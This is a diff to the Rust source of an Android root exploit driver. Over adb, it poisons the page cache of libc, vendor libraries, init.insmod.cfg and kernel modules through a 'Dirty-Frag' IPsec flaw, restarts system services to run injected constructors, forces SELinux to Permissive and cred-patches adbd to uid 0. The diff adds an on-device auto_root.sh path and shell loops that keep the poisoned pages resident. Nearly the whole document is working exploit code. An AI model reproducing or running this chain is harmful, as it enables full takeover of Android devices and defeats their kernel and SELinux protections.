@@ -167,6 +167,12 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
     let before = adb.sh("getenforce");
     info(&format!("uid={}  getenforce={}", adb.sh("id -u"), before));
     if before != "Enforcing" { warn(&format!("SELinux already {} (expected Enforcing)", before)); }
+
+    // Trampoline targets: push auto_root.sh + all spec files, run entirely on-device.
+    // Running from PC via adb shell causes pty corruption from trampoline fork() children.
+    if t.opt(&["trampoline"]).is_some() && cleanup == Cleanup::AdbRoot {
+        return run_trampoline_ondevice(t, &adb, &workdir, &serial);
+    }
     let dex = assets::write_to(&workdir, "e2e.dex", assets::E2E_DEX);
     adb.push(&dex.to_string_lossy(), "/data/local/tmp/e2e.dex");
     let dfp = assets::write_to(&workdir, "dfpoison", assets::DFPOISON);
@@ -182,9 +188,10 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
         t.hx(&["kernel", "delta_selinux_from_anchor"]) as u32).unwrap_or_else(|e| die(&e));
     let ndiff = carrier_want.iter().zip(&carrier_cur).filter(|(a, b)| a != b).count();
     ok(&format!("carrier_patched.ko  ({} diff bytes, anchor={}, delta={})", ndiff, t.s(&["kernel", "anchor_symbol"]), t.s(&["kernel", "delta_selinux_from_anchor"])));
-    step("init.insmod.cfg  (+insmod line, modprobe kept)");
+    let modprobe_kill = t.hx_opt(&["cfg", "modprobe_kill_off"]).map(|v| v as usize);
+    step(&format!("init.insmod.cfg  (+insmod line{})", if modprobe_kill.is_some() { ", modprobe killed" } else { ", modprobe kept" }));
     let cfg_orig = read_local(&t.local_path(&["cfg", "local_cfg"]));
-    let (cfg_cur, cfg_want) = build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]), t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize).unwrap_or_else(|e| die(&e));
+    let (cfg_cur, cfg_want) = build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]), t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize, modprobe_kill).unwrap_or_else(|e| die(&e));
     ok(&format!("cfg patched  ({} diff bytes)", cfg_want.iter().zip(&cfg_cur).filter(|(a, b)| a != b).count()));
 
     banner("STAGE  (shell: Dirty-Frag SA)");
@@ -196,48 +203,100 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
     let spi = t.hx(&["dirtyfrag", "sa_spi"]) as u32;
     let kmb = t.hx(&["dirtyfrag", "keymat_base"]) as u8;
     let ik = t.inj_key();
-    let eva_stub_len;
+    let mut eva_stub_len = 0usize;
     let mut orig_las: Vec<u8> = Vec::new();
 
     banner("POISON  (shell -> page caches)");
-    step("inject-lib + libandroid stubs  (native dfpoison, one SA, 2 files)");
-    let (eva_raw, eva_spec, cnts) = build_inject_stub(spi, kmb, port,
-        t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
-        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64,
-        &[(t.s(&["carrier", "device_path"]), carrier_cur.clone(), carrier_want.clone()),
-          (t.s(&["cfg", "device_path"]), cfg_cur.clone(), cfg_want.clone())]).unwrap_or_else(|e| die(&e));
-    eva_stub_len = eva_raw.len();
-    let (las_raw, las_spec) = build_libas_stub(&t.s(&["property_socket"]), &t.s(&["services", "tracking"]),
-        t.hx(&["libandroid_servers", "dump_off"]) as u64, t.hx(&["libandroid_servers", "dump_size"]) as usize).unwrap_or_else(|e| die(&e));
-    if matches!(cleanup, Cleanup::Postex | Cleanup::LeaveDisabled | Cleanup::Reboot) {
-        orig_las = adb.read_region(&t.s(&["libandroid_servers", "device_path"]), t.hx(&["libandroid_servers", "dump_off"]) as u64, las_raw.len());
+    if t.opt(&["trampoline"]).is_some() {
+        // Trampoline approach: libc cave/rela + embedded payload in libsdsprpc.so.
+        // Payload runs from WiFi HAL context (fork child) → reads carrier.ko + sends DirtyFrag packets.
+        step("trampoline: libc caves + embedded payload + libas + cfg");
+        let libc_path = t.s(&["trampoline", "libc_path"]);
+        let sdsprpc_path = inj_dev_path(t);
+        let libas_path = t.s(&["libandroid_servers", "device_path"]);
+        let cfg_dev_path = t.s(&["cfg", "device_path"]);
+        let caves_spec = read_local(&t.local_path(&["trampoline", "caves_spec"]));
+        let rela_spec = read_local(&t.local_path(&["trampoline", "rela_spec"]));
+        let emb_spec = read_local(&t.local_path(&["trampoline", "emb_spec"]));
+        let libas_sp = read_local(&t.local_path(&["trampoline", "libas_spec"]));
+        let cfg_sp = read_local(&t.local_path(&["trampoline", "cfg_spec"]));
+        // Build port spec: 5 ASCII digits at PORT_BASE
+        let port_base = t.hx(&["trampoline", "port_base"]) as u32;
+        let port_str = format!("{:05}", port);
+        let mut port_spec = Vec::new();
+        for (i, b) in port_str.bytes().enumerate() {
+            port_spec.extend_from_slice(&(port_base + i as u32).to_le_bytes());
+            port_spec.push(b);
+        }
+        // Combine emb + port into one spec for libsdsprpc
+        let mut emb_port = emb_spec.clone();
+        emb_port.extend_from_slice(&port_spec);
+        info(&format!("caves {}B, emb+port {}B, libas {}B, cfg {}B, rela {}B",
+            caves_spec.len()/5, emb_port.len()/5, libas_sp.len()/5, cfg_sp.len()/5, rela_spec.len()/5));
+        dfpoison_job(&adb, &workdir, port, spi, kmb, &[
+            (libc_path.clone(), caves_spec, "caves".into()),
+            (sdsprpc_path, emb_port, "emb".into()),
+            (libas_path, libas_sp, "libas".into()),
+            (cfg_dev_path, cfg_sp, "cfg".into()),
+            (libc_path, rela_spec, "rela".into())]);
+    } else {
+        step("inject-lib + libandroid stubs");
+        let (eva_raw, eva_spec, cnts) = build_inject_stub(spi, kmb, port,
+            t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
+            t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64,
+            &[(t.s(&["carrier", "device_path"]), carrier_cur.clone(), carrier_want.clone()),
+              (t.s(&["cfg", "device_path"]), cfg_cur.clone(), cfg_want.clone())],
+            t.bool_or(&["carrier", "hold_loop"], false)).unwrap_or_else(|e| die(&e));
+        eva_stub_len = eva_raw.len();
+        let ctl_svc = t.s_opt(&["services", "tracking_init"]).unwrap_or_else(|| t.s(&["services", "tracking"]));
+        let (las_raw, las_spec) = build_libas_stub(&t.s(&["property_socket"]), &ctl_svc,
+            t.hx(&["libandroid_servers", "dump_off"]) as u64, t.hx(&["libandroid_servers", "dump_size"]) as usize).unwrap_or_else(|e| die(&e));
+        if matches!(cleanup, Cleanup::Postex | Cleanup::LeaveDisabled | Cleanup::Reboot) {
+            orig_las = adb.read_region(&t.s(&["libandroid_servers", "device_path"]), t.hx(&["libandroid_servers", "dump_off"]) as u64, las_raw.len());
+        }
+        info(&format!("inject stub {}B (carrier IVs={}, cfg IVs={}); libas {}B", eva_raw.len(), cnts[0], cnts[1], las_raw.len()));
+        dfpoison_job(&adb, &workdir, port, spi, kmb, &[
+            (inj_dev_path(t), eva_spec, "inject".into()),
+            (t.s(&["libandroid_servers", "device_path"]), las_spec, "libas".into())]);
     }
-    info(&format!("inject stub {}B (carrier IVs={}, cfg IVs={}); libas {}B", eva_raw.len(), cnts[0], cnts[1], las_raw.len()));
-    dfpoison_job(&adb, &workdir, port, spi, kmb, &[
-        (inj_dev_path(t), eva_spec, "inject".into()),
-        (t.s(&["libandroid_servers", "device_path"]), las_spec, "libas".into())]);
 
     banner("TRIGGER  (shell)");
     let tsvc = t.s(&["services", "tracking"]);
     let isvc = t.s(&["services", "insmod_sh"]);
-    step(&format!("dumpsys input  ->  system_server restarts {}  ->  ctor poisons carrier + cfg", tsvc));
-    let pid0 = adb.sh(&format!("pidof {}", tsvc));
-    adb.sh("dumpsys input >/dev/null 2>&1");
-    let mut pid1 = pid0.clone();
-    for _ in 0..180 { ms(100); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
-    if pid1 == pid0 || pid1.is_empty() { stager.stop(); die(&format!("{} did not restart (pid still {}) — dump stub not hit", tsvc, pid0)); }
-    ok(&format!("{} restarted  pid {} -> {}", tsvc, pid0, pid1));
-    info(&format!("settling {}ms for the ctor's carrier/cfg poison to complete", settle_ms));
-    ms(settle_ms);
-    if verify_root {
-        let csha = adb.su(&format!("sha1sum {}", t.s(&["carrier", "device_path"])));
-        info(&format!("carrier page-cache sha (root check): {}…", &csha.chars().take(12).collect::<String>()));
+    if t.opt(&["trampoline"]).is_some() {
+        // Trampoline targets run the ENTIRE exploit on-device (auto_root.sh).
+        // Running from PC via adb shell causes pty corruption from trampoline fork() children.
+        step("on-device auto_root.sh (Phase 1: Permissive)");
+        adb.sh("rm -f /data/local/tmp/_root_result.txt");
+        adb.sh("nohup sh -c 'sh /data/local/tmp/auto_root.sh adbd_phase1 > /data/local/tmp/_root_result.txt 2>&1' >/dev/null 2>&1 &");
+        let mut result = String::new();
+        for _ in 0..60 {
+            ms(500);
+            result = adb.sh("cat /data/local/tmp/_root_result.txt 2>/dev/null");
+            if result.contains("Permissive") || result.contains("FAIL") { break; }
+        }
+        info(&format!("device: {}", result.lines().last().unwrap_or("")));
+    } else {
+        step(&format!("dumpsys input  ->  system_server restarts {}  ->  ctor poisons carrier + cfg", tsvc));
+        let pid0 = adb.sh(&format!("pidof {}", tsvc));
+        let las_path = t.s(&["libandroid_servers", "device_path"]);
+        let las_page = t.hx(&["libandroid_servers", "dump_off"]) / 4096;
+        let inj_path = inj_dev_path(t);
+        let inj_page = t.hx(&[ik, "stub_gap_off"]) / 4096;
+        adb.sh(&format!(
+            "(for i in $(seq 1 25);do dd if={las} bs=4096 skip={lp} count=1 of=/dev/null 2>/dev/null;\
+             dd if={inj} bs=4096 skip={ip} count=1 of=/dev/null 2>/dev/null;sleep 0.2;done)& \
+             H=$!;dumpsys input >/dev/null 2>&1;kill $H 2>/dev/null;wait $H 2>/dev/null",
+            las=las_path, lp=las_page, inj=inj_path, ip=inj_page));
+        let mut pid1 = pid0.clone();
+        for _ in 0..180 { ms(100); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
+        if pid1 == pid0 || pid1.is_empty() { stager.stop(); die(&format!("{} did not restart (pid still {}) — dump stub not hit", tsvc, pid0)); }
+        ok(&format!("{} restarted  pid {} -> {}", tsvc, pid0, pid1));
+        info(&format!("settling {}ms for the ctor's carrier/cfg poison to complete", settle_ms));
+        ms(settle_ms);
+        step(&format!("setprop ctl.start {}  ->  init finit_modules the poisoned carrier", isvc));
+        adb.sh(&format!("setprop ctl.start {}", isvc));
     }
-    if adb.sh(&format!("lsmod | grep -c {}", mod_name(&t.s(&["carrier", "device_path"])))) != "0" {
-        warn("carrier already loaded before finit — original may have raced in; reboot & retry");
-    }
-    step(&format!("setprop ctl.start {}  ->  init finit_modules the poisoned carrier", isvc));
-    adb.sh(&format!("setprop ctl.start {}", isvc));
 
     banner("VERIFY");
     let mut after = String::new();
@@ -277,9 +336,50 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
             info("READY FOR POST-EX: run with --postex");
         }
         Cleanup::Postex => run_postex_twocarrier(t, &adb, &workdir, ik, eva_stub_len, &orig_las, skip_magisk),
-        Cleanup::AdbRoot => { run_adbroot_twocarrier(t, &adb, &workdir, port, spi, kmb); stager.stop(); ok("stager stopped (SA reaped)"); }
+        Cleanup::AdbRoot => {
+            run_adbroot_twocarrier(t, &adb, &workdir, port, spi, kmb);
+            // Kill stager on-device (not via adb shell kill which drops transport)
+            adb.sh("pkill -f q3.Stager 2>/dev/null");
+            ok("stager stopped (SA reaped)");
+        }
         Cleanup::NoRestore => { stager.stop(); warn("--no-restore: device left fully poisoned & permissive"); }
     }
+}
+
+/// Trampoline targets: push FINAL_WORKING files and run auto_root.sh entirely on-device.
+fn run_trampoline_ondevice(t: &Target, adb: &Adb, workdir: &Path, _serial: &str) {
+    banner("ON-DEVICE ROOT  (auto_root.sh)");
+    step("pushing 12 files to /data/local/tmp/");
+    let base = t.local_path(&["trampoline", "caves_spec"]);
+    let dir = base.parent().unwrap();
+    let files = ["auto_root.sh", "ivm_writer", "Stager.jar", "iv_table_256.bin",
+        "spec_ivm_emb.bin", "spec_libas.bin", "spec_libc_caves.bin", "spec_libc_rela.bin",
+        "spec_cred2.bin", "cfg_records.bin", "cfg_records_vudc.bin", "ko_records.bin"];
+    for f in &files {
+        let src = dir.join(f);
+        if src.exists() {
+            adb.push(&src.to_string_lossy(), &format!("/data/local/tmp/{}", f));
+        }
+    }
+    adb.sh("chmod 755 /data/local/tmp/auto_root.sh /data/local/tmp/ivm_writer");
+    ok("12 files pushed");
+
+    step("running auto_root.sh");
+    let out = adb.sh("sh /data/local/tmp/auto_root.sh");
+    // adb shell may return early (pty corruption from trampoline fork).
+    // Check script output first. If garbled, wait for script to finish then check once.
+    if out.contains("ROOT OK") {
+        win("root succeeded");
+    } else {
+        info("adb returned early — waiting 10s for on-device script to finish...");
+        ms(10000);
+    }
+    let ge = adb.sh("getenforce");
+    let uid = adb.sh("id -u");
+    if uid.trim() == "0" && ge == "Permissive" { win(&format!("Permissive + uid=0")); }
+    else if ge == "Permissive" { ok(&format!("Permissive, uid={}", uid.trim())); }
+    else { err(&format!("getenforce={} uid={}", ge, uid.trim())); }
+    warn("residue (needs reboot): page-cache poison + loaded modules");
 }
 
 fn run_postex_twocarrier(t: &Target, adb: &Adb, workdir: &Path, ik: &str, eva_stub_len: usize, orig_las: &[u8], skip_magisk: bool) {
@@ -325,20 +425,62 @@ fn run_adbroot_twocarrier(t: &Target, adb: &Adb, workdir: &Path, port: u16, spi:
     banner("ADB-ROOT  (cred-patch adbd -> root adb shells, no Magisk)");
     if adb.sh("getenforce") != "Permissive" { die("not permissive — base chain failed; aborting adb-root"); }
     let pid = adbd_pid(adb).unwrap_or_else(|| die("could not find adbd pid"));
-    let cc = read_local(&t.local_path(&["cred_carrier", "local_ko"]));
-    step(&format!("Cred carrier (usbip-vudc) -> adbd pid {} + uid0 + caps + kernel ctx", pid));
-    let (credko, cmsg) = build_cred(t, cc, pid.parse().unwrap_or(0), true);
-    info(&cmsg);
-    push_bytes(adb, workdir, "uv.ko", &credko, "/data/local/tmp/uv.ko");
-    step("Poisoning init.insmod.cfg -> insmod uv.ko (native dfpoison, Stager SA)");
-    let cfg_spec = cfg_pe_spec(t, "/data/local/tmp/uv.ko");
-    dfpoison_job(adb, workdir, port, spi, keymat, &[(t.s(&["cfg", "device_path"]), cfg_spec, "cfg_pe".into())]);
-    step("ctl.start insmod_sh -> loads uv.ko -> cred-patch adbd");
-    adb.sh(&format!("setprop ctl.start {}", t.s(&["services", "insmod_sh"])));
-    // Verify by reading adbd's OWN creds (/proc/<pid>/status), not `id -u`: the cred-patch changes
-    // adbd's task creds, so only shells adbd forks AFTER the patch are root. In --local mode our own
-    // `id -u` stays uid 2000, so id -u would false-negative even on success; the /proc check is correct
-    // in both modes (and matches how NEW adb shells inherit the patched creds).
+
+    if t.opt(&["trampoline", "cred_spec"]).is_some() {
+        // BL-decode cred_patch: pre-built spec with runtime PID patch
+        step(&format!("BL-decode cred-patch -> adbd pid {} + uid0 + caps", pid));
+        let cred_spec = read_local(&t.local_path(&["trampoline", "cred_spec"]));
+        let cred_cfg = read_local(&t.local_path(&["trampoline", "cred_cfg_spec"]));
+        let pid_off = t.hx(&["trampoline", "pid_off"]) as u32;
+        let pid_val: u32 = pid.parse().unwrap_or(0);
+        let movz = 0x52800000u32 | (pid_val << 5);
+        let mut pid_spec = Vec::new();
+        for i in 0u32..4 {
+            pid_spec.extend_from_slice(&(pid_off + i).to_le_bytes());
+            pid_spec.push(((movz >> (i * 8)) & 0xFF) as u8);
+        }
+        let vudc_path = t.s(&["cred_carrier", "device_path"]);
+        let cfg_path2 = t.s(&["cfg", "device_path"]);
+        let isvc = t.s(&["services", "insmod_sh"]);
+        let mut combined_cred = cred_spec;
+        combined_cred.extend_from_slice(&pid_spec);
+        // Append modprobe kill to cfg spec (page cache may have evicted Phase 1's '#')
+        let mut cfg_cred2 = cred_cfg;
+        if let Some(mk) = t.hx_opt(&["cfg", "modprobe_kill_off"]) {
+            cfg_cred2.extend_from_slice(&(mk as u32).to_le_bytes());
+            cfg_cred2.push(b'#');
+        }
+        info(&format!("cred {}+4 records, cfg {} records, pid={}", (combined_cred.len()-20)/5, cfg_cred2.len()/5, pid));
+        dfpoison_job(adb, workdir, port, spi, keymat, &[
+            (vudc_path.clone(), combined_cred, "cred".into()),
+            (cfg_path2.clone(), cfg_cred2, "cfg_cred".into())]);
+        step("ctl.start insmod_sh -> loads vudc.ko -> cred-patch adbd");
+        // Page keeper for vudc pages + cfg, insmod, verify — all in one shell
+        adb.sh(&format!(
+            "while true;do \
+             dd if={vudc} bs=4096 skip=4 count=1 of=/dev/null 2>/dev/null;\
+             dd if={vudc} bs=4096 skip=9 count=1 of=/dev/null 2>/dev/null;\
+             cat {cfg} >/dev/null 2>&1;\
+             sleep 0.2;done & K=$!;\
+             setprop ctl.start {isvc};\
+             i=0;while [ $i -lt 30 ];do sleep 0.3;\
+             U=$(grep -m1 Uid /proc/{pid}/status 2>/dev/null|awk '{{print $2}}');\
+             [ \"$U\" = \"0\" ]&&break;i=$((i+1));done;\
+             kill $K 2>/dev/null;echo uid=$U",
+            vudc=vudc_path, cfg=cfg_path2, isvc=isvc, pid=pid));
+    } else {
+        let cc = read_local(&t.local_path(&["cred_carrier", "local_ko"]));
+        step(&format!("Cred carrier (usbip-vudc) -> adbd pid {} + uid0 + caps + kernel ctx", pid));
+        let (credko, cmsg) = build_cred(t, cc, pid.parse().unwrap_or(0), true);
+        info(&cmsg);
+        push_bytes(adb, workdir, "uv.ko", &credko, "/data/local/tmp/uv.ko");
+        step("Poisoning init.insmod.cfg -> insmod uv.ko (native dfpoison, Stager SA)");
+        let cfg_spec = cfg_pe_spec(t, "/data/local/tmp/uv.ko");
+        dfpoison_job(adb, workdir, port, spi, keymat, &[(t.s(&["cfg", "device_path"]), cfg_spec, "cfg_pe".into())]);
+        step("ctl.start insmod_sh -> loads uv.ko -> cred-patch adbd");
+        adb.sh(&format!("setprop ctl.start {}", t.s(&["services", "insmod_sh"])));
+    }
+
     let mut rooted = false;
     for _ in 0..120 {
         ms(100);
@@ -347,14 +489,21 @@ fn run_adbroot_twocarrier(t: &Target, adb: &Adb, workdir: &Path, port: u16, spi:
     }
     if !rooted { die("adbd not cred-patched (uv.ko load failed?)"); }
     win(&format!("adbd (pid {}) cred-patched -> NEW adb shells are uid 0 + all caps + kernel context", pid));
-    info("Open a NEW adb shell to get full root:   adb shell   ->   id  (uid=0)");
+    // Verify root by opening a new adb shell (must happen BEFORE stager.stop which drops transport)
+    let verify_id = adb.sh("id -u");
+    if verify_id.trim() == "0" {
+        ok("verified: new adb shell is uid=0");
+    } else {
+        warn(&format!("new shell returned uid={} (adbd may have restarted)", verify_id.trim()));
+    }
     warn("residue (needs reboot): carrier/cfg page-cache poison + loaded modules (exit neutralized, rmmod-safe)");
 }
 
 /// Build the cfg page-cache poison spec over the whole inject region for an insmod line -> insmod_path.
 fn cfg_pe_spec(t: &Target, insmod_path: &str) -> Vec<u8> {
     let cfg_orig = read_local(&t.local_path(&["cfg", "local_cfg"]));
-    let (_c, cfg_want) = build_cfg(cfg_orig, insmod_path, t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize).unwrap_or_else(|e| die(&e));
+    let modprobe_kill = t.hx_opt(&["cfg", "modprobe_kill_off"]).map(|v| v as usize);
+    let (_c, cfg_want) = build_cfg(cfg_orig, insmod_path, t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize, modprobe_kill).unwrap_or_else(|e| die(&e));
     let off = t.hx(&["cfg", "inject_off"]) as usize; let ln = t.hx(&["cfg", "inject_len"]) as usize;
     let mut spec = Vec::new();
     for i in off..off + ln { spec.extend_from_slice(&(i as u32).to_le_bytes()); spec.push(cfg_want[i]); }
@@ -441,7 +590,8 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
     let carrier_cur = cc;
     step("init.insmod.cfg  (+insmod line for the carrier)");
     let cfg_orig = read_local(&t.local_path(&["cfg", "local_cfg"]));
-    let (cfg_cur, cfg_want) = build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]), t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize).unwrap_or_else(|e| die(&e));
+    let modprobe_kill_m = t.hx_opt(&["cfg", "modprobe_kill_off"]).map(|v| v as usize);
+    let (cfg_cur, cfg_want) = build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]), t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize, modprobe_kill_m).unwrap_or_else(|e| die(&e));
     ok(&format!("cfg patched  ({} diff bytes)", cfg_want.iter().zip(&cfg_cur).filter(|(a, b)| a != b).count()));
 
     banner("POISON  (shell -> page caches)");
@@ -453,12 +603,14 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
     let kmb = t.hx(&["dirtyfrag", "keymat_base"]) as u8;
     let (eva_raw, eva_spec, cnts) = build_inject_stub(spi, kmb, port,
         t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
-        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, &inj_files).unwrap_or_else(|e| die(&e));
+        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, &inj_files,
+        t.bool_or(&["carrier", "hold_loop"], false)).unwrap_or_else(|e| die(&e));
     eva_stub_len = eva_raw.len();
     info(&format!("stub {}B  (IVs={:?})  gap fits {}B", eva_raw.len(), cnts, t.hx(&[ik, "stub_gap_size"])));
     poison(&adb, &workdir, &inj_dev_path(t), &eva_spec, "inject");
     step("libandroid_servers::dump stub  (-> ctl.restart trackingservice)");
-    let (las_raw, las_spec) = build_libas_stub(&t.s(&["property_socket"]), &t.s(&["services", "tracking"]),
+    let ctl_svc = t.s_opt(&["services", "tracking_init"]).unwrap_or_else(|| t.s(&["services", "tracking"]));
+    let (las_raw, las_spec) = build_libas_stub(&t.s(&["property_socket"]), &ctl_svc,
         t.hx(&["libandroid_servers", "dump_off"]) as u64, t.hx(&["libandroid_servers", "dump_size"]) as usize).unwrap_or_else(|e| die(&e));
     orig_las = adb.read_region(&t.s(&["libandroid_servers", "device_path"]), t.hx(&["libandroid_servers", "dump_off"]) as u64, las_raw.len());
     poison(&adb, &workdir, &t.s(&["libandroid_servers", "device_path"]), &las_spec, "libas");
@@ -479,7 +631,17 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
     let isvc = t.s(&["services", "insmod_sh"]);
     step(&format!("dumpsys input  ->  system_server restarts {}  ->  ctor poisons carrier", tsvc));
     let pid0 = adb.sh(&format!("pidof {}", tsvc));
-    adb.sh("dumpsys input >/dev/null 2>&1");
+    {
+        let las_p = t.s(&["libandroid_servers", "device_path"]);
+        let las_pg = t.hx(&["libandroid_servers", "dump_off"]) / 4096;
+        let inj_p = inj_dev_path(t);
+        let inj_pg = t.hx(&[ik, "stub_gap_off"]) / 4096;
+        adb.sh(&format!(
+            "(for i in $(seq 1 25);do dd if={las} bs=4096 skip={lp} count=1 of=/dev/null 2>/dev/null;\
+             dd if={inj} bs=4096 skip={ip} count=1 of=/dev/null 2>/dev/null;sleep 0.2;done)& \
+             H=$!;dumpsys input >/dev/null 2>&1;kill $H 2>/dev/null;wait $H 2>/dev/null",
+            las=las_p, lp=las_pg, inj=inj_p, ip=inj_pg));
+    }
     let mut pid1 = pid0.clone();
     for _ in 0..200 { ms(100); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
     if pid1 == pid0 || pid1.is_empty() {
@@ -583,13 +745,14 @@ fn merged_stub_fits(t: &Target, adb_root: bool) -> bool {
     let (credko, _) = match build_credmod(cc.clone(), dsel, dfv, dpt, 0, dssuse, enf, cred, csec) { Ok(x) => x, Err(_) => return true };
     let shell_cfg = t.bool_or(&["cfg", "shell_poison_under_enforcing"], false);
     let cfg_orig = match std::fs::read(t.local_path(&["cfg", "local_cfg"])) { Ok(b) => b, Err(_) => return true };
-    let (cfg_cur, cfg_want) = match build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]), t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize) { Ok(x) => x, Err(_) => return true };
+    let (cfg_cur, cfg_want) = match build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]), t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize, t.hx_opt(&["cfg", "modprobe_kill_off"]).map(|v| v as usize)) { Ok(x) => x, Err(_) => return true };
     let ik = t.inj_key();
     let mut files = vec![(t.s(&["carrier", "device_path"]), cc, credko)];
     if !shell_cfg { files.push((t.s(&["cfg", "device_path"]), cfg_cur, cfg_want)); }
     build_inject_stub(t.hx(&["dirtyfrag", "sa_spi"]) as u32, t.hx(&["dirtyfrag", "keymat_base"]) as u8, 9999,
         t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
-        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, &files).is_ok()
+        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, &files,
+        t.bool_or(&["carrier", "hold_loop"], false)).is_ok()
 }
 
 const SPLIT_CRED_MOD: &str = "rdbgcp";   // Phase-B module name (distinct from the loaded Phase-A carrier)
@@ -625,14 +788,16 @@ fn run_merged_split(t: &Target, serial: &str, adb: &Adb, cleanup: Cleanup, settl
     ok(&emsg);
     let cfg_orig = read_local(&t.local_path(&["cfg", "local_cfg"]));
     let (cfg_cur, cfg_want) = build_cfg(cfg_orig, &t.s(&["carrier", "device_path"]),
-        t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize).unwrap_or_else(|e| die(&e));
+        t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize,
+        t.hx_opt(&["cfg", "modprobe_kill_off"]).map(|v| v as usize)).unwrap_or_else(|e| die(&e));
 
     let mut inj_files = vec![(t.s(&["carrier", "device_path"]), cc.clone(), enfko)];
     if !shell_cfg { inj_files.push((t.s(&["cfg", "device_path"]), cfg_cur.clone(), cfg_want.clone())); }
     step(&format!("inject-lib stub  (init_array[0] -> {}-file enforcing poison in the gap)", inj_files.len()));
     let (eva_raw, eva_spec, cnts) = build_inject_stub(spi, kmb, port,
         t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
-        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, &inj_files)
+        t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64, &inj_files,
+        t.bool_or(&["carrier", "hold_loop"], false))
         .unwrap_or_else(|e| { stager.stop(); die(&format!("Phase-A inject stub: {}", e)) });
     let eva_stub_len = eva_raw.len();
     info(&format!("stub {}B (IVs={:?}) gap fits {}B", eva_raw.len(), cnts, t.hx(&[ik, "stub_gap_size"])));
@@ -657,7 +822,17 @@ fn run_merged_split(t: &Target, serial: &str, adb: &Adb, cleanup: Cleanup, settl
     let isvc = t.s(&["services", "insmod_sh"]);
     step(&format!("dumpsys input  ->  system_server restarts {}  ->  ctor poisons carrier", tsvc));
     let pid0 = adb.sh(&format!("pidof {}", tsvc));
-    adb.sh("dumpsys input >/dev/null 2>&1");
+    {
+        let las_p = t.s(&["libandroid_servers", "device_path"]);
+        let las_pg = t.hx(&["libandroid_servers", "dump_off"]) / 4096;
+        let inj_p = inj_dev_path(t);
+        let inj_pg = t.hx(&[ik, "stub_gap_off"]) / 4096;
+        adb.sh(&format!(
+            "(for i in $(seq 1 25);do dd if={las} bs=4096 skip={lp} count=1 of=/dev/null 2>/dev/null;\
+             dd if={inj} bs=4096 skip={ip} count=1 of=/dev/null 2>/dev/null;sleep 0.2;done)& \
+             H=$!;dumpsys input >/dev/null 2>&1;kill $H 2>/dev/null;wait $H 2>/dev/null",
+            las=las_p, lp=las_pg, inj=inj_p, ip=inj_pg));
+    }
     let mut pid1 = pid0.clone();
     for _ in 0..200 { ms(100); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
     if pid1 == pid0 || pid1.is_empty() {
